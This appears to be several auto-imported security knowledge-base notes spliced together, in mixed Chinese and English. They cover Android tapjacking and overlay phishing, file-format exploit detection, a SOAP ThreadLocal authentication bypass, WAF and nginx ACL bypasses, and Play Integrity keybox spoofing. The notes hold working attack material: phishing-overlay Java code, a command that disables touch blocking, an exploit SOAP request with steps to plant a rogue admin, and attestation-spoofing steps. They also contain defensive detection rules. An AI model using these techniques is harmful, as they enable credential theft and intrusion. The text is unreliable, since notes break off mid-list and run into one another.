setFilterTouchesWhenObscured 利用 Tapjacking-ExportedActivity FloatingWindowApp Qark Recent overlay-based malware techniques Accessibility Overlay Phishing (Banking-Trojan Variant) How it works Typical workflow used by banking Trojans 检测 & Mitigation # 核心要点 Look for exported activities in the Android manifest (an activity with an intent-filter is exported by default). If an exported activity is protected by a permission, the attacking app will need the same permission, which limits exploitability. Check the minimum SDK version android:minSdkVersion in AndroidManifest.xml. If it is lower than 30, older default behaviors may make tapjacking easier to 利用. Trusted windows (accessibility, IME, assistant) still receive events. Invisible or fully transparent overlays also 绕过 the block, which attackers try to abuse by keeping alpha < 0.8. Partial overlays that leave the target area visible are not auto-blocked. Mitigate in sensitive views by rejecting events with the FLAG WINDOW IS PARTIALLY OBSCURED flag: The attribute setFilterTouchesWhenObscured set to true can also prevent the 利用 of this 漏洞 if the Android version is lower.\ The most recent Android application performing a Tapjacking attack (+ invoking before an exported activity of the attacked application) can be found in: https://github.com/carlospolop/Tapjacking-ExportedActivity. Hidden-VNC banking RATs briefly display phishing overlays to capture 凭据，then rely on covert VNC plus Accessibility to replay taps with fewer on-device artifacts. 下载 an HTML/JS overlay template from the C2 that perfectly imitates that specific application (Logo, colours, i18n strings…). Display the overlay, harvest 凭据 / PIN/pattern. Audit the list of installed apps with adb shell pm list packages -3 -e BIND ACCESSIBILITY SERVICE. # 命令 / 载荷 / 操作片段 # 1. Android 12+ default blocking & compat flags 1234# disable blocking for a specific package (for PoC crafting)adb shell am compat disable BLOCK_UNTRUSTED_TOUCHES com.example.victim# re‑enableadb shell am compat reset BLOCK_UNTRUSTED_TOUCHES com.example.victim # 2. Handling partial occlusion 1234567@Overridepublic boolean onFilterTouchEventForSecurity(MotionEvent event) { if ((event.getFlags() & MotionEvent.FLAG_WINDOW_IS_PARTIALLY_OBSCURED) != 0) { return false; // drop tap when anything partially obscures us } return super.onFilterTouchEventForSecurity(event);} # 3. setFilterTouchesWhenObscured 123456<Button android:text="Button"android:id="@+id/button1"android:layout_width="wrap_content"android:layout_height="wrap_content"android:filterTouchesWhenObscured="true"></Button> # 4. How it works 12345678910111213WebView phishingView = new WebView(getApplicationContext());phishingView.getSettings().setJavaScriptEnabled(true);phishingView.loadUrl("file:///android_asset/bank_login.html");WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);WindowManager.LayoutParams lp = new WindowManager.LayoutParams( WindowManager.LayoutParams.MATCH_PARENT, WindowManager.LayoutParams.MATCH_PARENT, WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY, // <-- bypasses SYSTEM_ALERT_WINDOW prompt WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL, // «through» flag → forward touches PixelFormat.TRANSLUCENT);wm.addView(phishingView, lp); # 工具与参考入口 https://github.com/carlospolop/Tapjacking-ExportedActivity FloatingWindowApp qark Android Developer’s Reference setFilterTouchesWhenObscured(boolean) Android Developers – Tapjacking risk & mitigations (updated 2024) Zimperium – HOOK v3 overlay expansion (Aug 2025) # 检查清单 是否提取进程链 / 命令行 / 网络 / 文件 / 日志线索 是否区分攻击行为和正常管理行为 是否记录绕过假设与限制 是否形成检测规则或查询语句 # 关联 防御检测与 OPSEC 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

title: Structural File‑Format 利用 检测 (0‑Click Chains)
content: 来源路径： 02-知识点/防御检测与OPSEC/Structural File‑Format 利用 检测 (0‑Click Chains).md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Structural File‑Format 利用 检测 (0‑Click Chains) [!summary] 提炼定位 面向 防御检测与 OPSEC 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 围绕 Structural File‑Format 利用 检测 (0‑Click Chains) 建立检测、规避、溯源或 OPSEC 检查。 把行为、进程链、网络、文件、日志事件转化为可验证线索。 # 中文提炼 核心目标是围绕 Structural File‑Format 利用 检测 (0‑Click Chains) 建立行为证据、检测逻辑和操作暴露面。 优先关注：Why structure, not signatures、PDF/JBIG2 – FORCEDENTRY (CVE‑2021‑30860)、WebP/VP8L – BLASTPASS (CVE‑2023‑4863)、TrueType – TRIANGULATION (CVE‑2023‑41990)、DNG/TIFF – CVE‑2025‑43300；把命令、进程、文件、网络、注册表 / 日志事件映射到检测字段。 区分正常管理行为与攻击行为，避免只按工具名告警；优先写可复现的查询条件。 OPSEC 记录应包括噪声来源、持久化痕迹、清理步骤和不可规避风险。 本页已沉淀 7 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Why structure, not signatures PDF/JBIG2 – FORCEDENTRY (CVE‑2021‑30860) WebP/VP8L – BLASTPASS (CVE‑2023‑4863) TrueType – TRIANGULATION (CVE‑2023‑41990) DNG/TIFF – CVE‑2025‑43300 DNG/TIFF – Samsung libimagecodec.quram.so (CVE‑2025‑21042) + Appended ZIP 载荷 (LANDFALL) HEIF/AVIF – libheif & libde265 (CVE‑2024‑41311, CVE‑2025‑29482, CVE‑2025‑65586) Implementation patterns and performance DFIR tips and edge cases Related 工具 # 核心要点 Key idea: encode structural impossibilities and cross‑field inconsistencies that only appear when a vulnerable decoder/parser state is reached. When weaponized samples are unavailable and 载荷 bytes mutate, traditional IOC/YARA patterns fail. Structural 检测 inspects the 容器’s declared layout versus what is mathematically or semantically possible for the format implementation. Detect contradictory fields that indicate parser confusion or 整数溢出 set‑ups Works without embedded 载荷 signatures Total size of constructed Huffman tables exceeds the safe upper bound expected by the reference/patched implementations, implying the overflow precondition. Robust against byte‑level polymorphism of the 载荷 Presence of undocumented/forbidden opcodes in Apple’s interpreter used by the 利用 chain. Dump font tables (e.g., using fontTools/ttx) and scan fpgm/prep/glyf programs Reported exploited in the wild; excellent candidate for structural consistency checks dd if=sample.dng of = 载荷.zip bs=1 skip="$off" zipdetails -v 载荷.zip; unzip -l 载荷.zip Exploited in the wild against Samsung’s libimagecodec.quram.so (CVE‑2025‑21042). The appended ZIP contained native modules (e.g., loader + SELinux policy editor) extracted/executed post‑RCE. Auto‑detect file type and dispatch only relevant analyzers (PDF/JBIG2, WebP/VP8L, TTF, DNG/TIFF, HEIF/AVIF) Run analyses in parallel (thread‑pool) for bulk triage # 命令 / 载荷 / 操作片段 # 1. PDF/JBIG2 – FORCEDENTRY (CVE‑2021‑30860) 123# Detecting impossible dictionary state used by FORCEDENTRYif input_symbols_count == 0 and (ex_syms > 0 and ex_syms < 4): mark_malicious("JBIG2 impossible symbol dictionary state") # 2. WebP/VP8L – BLASTPASS (CVE‑2023‑4863) 1234# Detect malformed Huffman table construction triggering overflowlet total_size = sum(table_sizes)if total_size > 2954: # example bound: FIXED_TABLE_SIZE + MAX_TABLE_SIZE mark_malicious("VP8L oversized Huffman tables") # 3. TrueType – TRIANGULATION (CVE‑2023‑41990) 123456# Flag undocumented TrueType bytecode leveraged by TRIANGULATIONswitch opcode: case 0x8F, 0x90: mark_malicious("Undocumented TrueType bytecode") default: continue # 4. DNG/TIFF – CVE‑2025‑43300 123# Metadata claims 2 samples per pixel but stream header exposes only 1 componentif samples_per_pixel == 2 and sof3_components == 1: mark_malicious("DNG/TIFF metadata vs. stream mismatch") # 5. DNG/TIFF – Samsung libimagecodec.quram.so (CVE‑2025‑21042) + Appended ZIP 载荷 (LANDFALL) 12345678910# Detect appended ZIP payload hidden after DNG/TIFF data (Samsung chain)if is_tiff_dng(magic): ext = file_extension() if ext in {".jpg", ".jpeg"}: mark_suspicious("Extension/magic mismatch: DNG vs JPEG") zip_off = rfind_any(["PK\x05\x06", "PK\x03\x04"], search_window_last_n_bytes=8*1024*1024) if zip_off >= 0: end_dng = approx_end_of_tiff_data() # max(end of Strip/Tile/JPEGInterchangeFormat regions) if zip_off > end_dng + 0x200: mark_malicious("DNG with appended ZIP payload (LANDFALL‑style)") # 6. content: 来源路径： 02-知识点/防御检测与OPSEC/SOAP-JAX-WS ThreadLocal 认证 绕过.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # SOAP-JAX-WS ThreadLocal 认证 绕过 [!summary] 提炼定位 面向 防御检测与 OPSEC 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 围绕 SOAP-JAX-WS ThreadLocal 认证 绕过 建立检测、规避、溯源或 OPSEC 检查。 把行为、进程链、网络、文件、日志事件转化为可验证线索。 # 中文提炼 核心目标是围绕 SOAP-JAX-WS ThreadLocal 认证 绕过 建立行为证据、检测逻辑和操作暴露面。 优先关注：SOAP/JAX-WS ThreadLocal 认证 绕过、TL;DR、Root Cause、侦察、利用；把命令、进程、文件、网络、注册表 / 日志事件映射到检测字段。 区分正常管理行为与攻击行为，避免只按工具名告警；优先写可复现的查询条件。 OPSEC 记录应包括噪声来源、持久化痕迹、清理步骤和不可规避风险。 本页已沉淀 2 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 SOAP/JAX-WS ThreadLocal 认证 绕过 TL;DR Root Cause 侦察 利用 2025 HID ActivID/IASP case study (HID-PSA-2025-002) Validating the Bug # 核心要点 Some middleware chains store the authenticated Subject/Principal inside a static ThreadLocal and only refresh it when a proprietary SOAP header arrives. Because WebLogic/JBoss/GlassFish recycle worker threads, dropping that header causes the last privileged Subject processed by the thread to be silently reused. Hammer the vulnerable endpoint with header-less but well-formed SOAP bodies until a reused thread grants you the stolen administrator context. 2025 HID ActivID/IASP (HID-PSA-2025-002) is a real-world instance: JAX-WS handler caches a SubjectHolder ThreadLocal, letting unauthenticated SOAP calls inherit the identity set by previous console/SSP requests. Handlers similar to the following only overwrite the thread-local identity when the custom header is present, so the previous request's context survives: Enumerate the reverse proxy /routing rules to locate hidden SOAP trees that may block ?wsdl yet accept POSTs (map them alongside the flow in 80,443：Pentesting Web 方法论). Any subsequent SOAP call lacking the header on the same worker thread inherits that cached Subject, allowing unauthenticated creation of administrator users or credential import via endpoints such as UserManager or CredentialManager. Reliable 利用 pattern observed: LoginHandlerChain.xml → LoginHandler.handleMessage() unmarshals mySubjectHeader and stores the Subject in SubjectHolder (a static ThreadLocal). In-field PoC from the advisory uses two-step SOAP abuse: first getUsers to leak info, then createUser + importCredential to plant a rogue admin when the privileged thread hits. Attach JDWP (-agentlib:jdwp=transport=dt socket,server=y,address=5005,suspend=n) or similar debugging hooks to watch the ThreadLocal contents before and after each call, confirming that an unauthenticated request inherited a prior administrator Subject. # 命令 / 载荷 / 操作片段 # 1. Root Cause 12345678910public boolean handleMessage(SOAPMessageContext ctx) { if (!outbound) { SOAPHeader hdr = ctx.getMessage().getSOAPPart().getEnvelope().getHeader(); SOAPHeaderElement e = findHeader(hdr, subjectName); if (e != null) { SubjectHolder.setSubject(unmarshal(e)); } } return true;} # 2. 利用 1234567891011121314POST /ac-iasp-backend-jaxws/UserManager HTTP/1.1Host: targetContent-Type: text/xml;charset=UTF-8<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:jax="http://jaxws.user.frontend.iasp.service.actividentity.com"> <soapenv:Header/> <soapenv:Body> <jax:findUserIds> <arg0></arg0> <arg1>spl*</arg1> </jax:findUserIds> </soapenv:Body></soapenv:Envelope> # 工具与参考入口 Burp Suite Wsdler Synacktiv – ActivID 认证 绕过 (HID-PSA-2025-002) # 检查清单 是否提取进程链 / 命令行 / 网络 / 文件 / 日志线索 是否区分攻击行为和正常管理行为 是否记录绕过假设与限制 是否形成检测规则或查询语句 # 关联 防御检测与 OPSEC 总览 知识地图 侦察枚举流水线 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

By routing traffic through various proxies, each request appears to originate from a different source, diluting the rate limit's effectiveness. If the limiter protects only /verify but not /api/v2/verify, you can also combine path confusion with HTTP/2 multiplexing for extremely high-speed OTP or credential brute-forcing. 🐾 Tip: PortSwigger’s Turbo Intruder supports HTTP/2 and lets you fine-tune maxConcurrentConnections and requestsPerConnection to automate this attack. This simple optimisation can more than double your throughput without touching any other 绕过 technique. However, if the backend server performs a different normalization (removing characters that nginx doesn't remove) it might be possible to 绕过 this defense. Nginx is configured to block access to /admin.php but it's possible to 绕过 this by accessing /admin.php/index.php. This research mentions that it was possible to 绕过 AWS WAF rules applied over HTTP headers by sending a "malformed" header that wasn't properly parsed by AWS but it was by the backend server. For example, sending the following request with a SQL 注入 in the header X-Query: It was possible to 绕过 AWS WAF because it wouldn't understand that the next line is part of the value of the header while the NODEJS server did (this was fixed). This is especially relevant in 利用 chains such as React2Shell, where the malicious server-side object graph can stay unchanged while only the HTTP transport syntax is mutated until the WAF and the origin disagree. Duplicate parameter precedence mismatch: if the WAF uses the last boundary= but the backend uses the first one, the WAF can parse an empty body while the backend parses the attacker-controlled parts. Boundary termination quirks: if the WAF accepts --boundary-- as the final marker but the backend rejects the trailing whitespace, the WAF stops scanning too early and the backend keeps parsing later parts. For AWS WAF, you can check the documentation**😗* From Azure docs**😗* Send 载荷 in untrusted headers (e.g., User-Agent) on a GET to a .js path to avoid content inspection, then immediately request the main HTML to influence the cached variant. nowafpls: Burp plugin to add junk data to requests to 绕过 WAFs by length # 命令 / 载荷 / 操作片段 # 1. 绕过 Nginx ACL Rules with Pathname Manipulation <a href="#heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules" id="heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules"></a> 1234567location = /admin { deny all;}location = /admin/ { deny all;} # 2. PHP-FPM 12345678location = /admin.php { deny all;}location ~ \.php$ { include snippets/fastcgi-php.conf; fastcgi_pass unix:/run/php/php8.1-fpm.sock;} # 3. How to prevent 123location ~* ^/admin { deny all;} # 4. Malformed Header 123456GET / HTTP/1.1
Host: target.com
X-Query: Value

Connection: close

Instead of forging Google’s JWT, spoof the signals Google evaluates so they correspond to a different, legitimate device profile. The attack chain: Replace the key attestation certificate chain (keybox.xml) with one from a genuine device so Play Integrity sees a certified/locked device. Google mitigates by revoking abused keyboxes; rotation is required when a keybox is blocked. Inject a valid keybox: In Keybox, choose Valid to 下载 /apply a new keybox.xml (vendor attestation 凭据). This file underpins hardware key attestation and is now spoofed from a certified/locked device. Scope: This 绕过 only spoofs attestation inputs; backend signature verification by Google still succeeds because the JWT itself is genuine. # 工具与参考入口 ReZygisk TrickyStore Tricky Addon KSU Web UI Play Integrity API Checker Key Attestation Play Integrity API: How It Works & How to 绕过 It Android keybox attestation analysis # 检查清单 是否提取进程链 / 命令行 / 网络 / 文件 / 日志线索 是否区分攻击行为和正常管理行为 是否记录绕过假设与限制 是否形成检测规则或查询语句 # 关联 防御检测与 OPSEC 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。
